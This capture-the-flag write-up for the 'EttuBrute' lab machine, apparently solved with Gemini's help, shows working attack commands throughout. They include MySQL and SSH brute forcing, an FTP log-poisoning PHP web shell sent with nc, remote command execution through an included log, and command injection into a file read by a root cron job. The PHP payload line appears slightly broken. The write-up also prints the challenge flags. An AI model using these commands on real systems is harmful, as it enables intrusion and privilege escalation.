# EttuBrute CTF Writeup
(*solved using gemini 🤖🤖🤖*)
## Target Information
- **IP Address:** 10.49.158.167
- **Operating System:** Linux (Ubuntu)

---

## 1. Enumeration

### Network Scan
Initial `nmap` scan revealed the following open ports:
- **21 (FTP):** vsFTPd 3.0.5
- **22 (SSH):** OpenSSH 8.2p1
- **80 (HTTP):** Apache 2.4.41
- **3306 (MySQL):** MySQL 8.0.41

### Database Enumeration
Brute-forcing the MySQL `root` user with `rockyou.txt` yielded the password `rockyou`. Accessing the database revealed a `website` database with a `users` table:

```bash
mysql -u root -p'rockyou' -h 10.49.158.167 --skip-ssl -D website -e "SELECT * FROM users;"
# Result: 1 | Adrian | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we
```

The bcrypt hash was cracked to: `tigger`.

---

## 2. Initial Access

### Web Exploitation (LFI & Log Poisoning)
Logging into the web application as `Adrian:tigger` provided access to `welcome.php`. This page contained a "Log" button that sent a POST request `log=Log` to include `/var/log/vsftpd.log`.

#### Log Poisoning via FTP
I poisoned the FTP logs by providing a PHP shell payload as the username:

```bash
echo -e "USER <?php system(\"
_REQUEST['cmd']\"); ?>\r\nPASS password\r\nQUIT\r\n" | nc -vn 10.49.158.167 21
```

#### Remote Code Execution (RCE)
By appending the `cmd` parameter to the POST request, I verified RCE:

```bash
curl -s -b cookies.txt -X POST -d "log=Log&cmd=id" http://10.49.158.167/welcome.php | grep "uid="
```

---

## 3. User Pivot

### Password Cracking (Custom Wordlist)
In `/home/adrian/`, I found a `.reminder` file:
```
best of 64
+ exclamation

ettubrute
```

Using this hint, I generated a custom wordlist:
1. **Seed:** `ettubrute`
2. **Rules:** Applied John the Ripper's `best64` rules.
3. **Suffix:** Appended `!` to all results.

```bash
echo "ettubrute" > seed.txt
john --wordlist=seed.txt --rules=best64 --stdout > mutations.txt
sed 's/$/!/' mutations.txt > mutations_excl.txt
cat mutations.txt mutations_excl.txt > final_wordlist.txt
```

#### SSH Brute Force
```bash
hydra -l adrian -P final_wordlist.txt ssh://10.49.158.167
```
**Credentials found:** `adrian:theettubrute!`

**User Flag:** `THM{PoI$0n_tH@t_L0g}`

---

## 4. Privilege Escalation

### Process Monitoring
I uploaded and ran `pspy64` to observe background processes:

```bash
scp pspy64 adrian@10.49.158.167:/tmp/pspy64
ssh adrian@10.49.158.167 "chmod +x /tmp/pspy64; /tmp/pspy64"
```

I observed a root cronjob executing `/root/check_in.sh`, which in turn executed a shell command using content from the world-writable file `/home/adrian/punch_in`:
`2026/05/02 08:44:01 CMD: UID=0 PID=9181 | /usr/bin/sh -c echo Punched in at [content from file]`

### Command Injection
I injected a command into `punch_in` to extract the root flag:

```bash
echo 'Punched in at 08:55 ; cat /root/root.txt > /tmp/root_flag.txt; chmod 644 /tmp/root_flag.txt' >> /home/adrian/punch_in
```

After the cronjob executed (every minute), I retrieved the flag:

```bash
cat /tmp/root_flag.txt
```

**Root Flag:** `THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}`
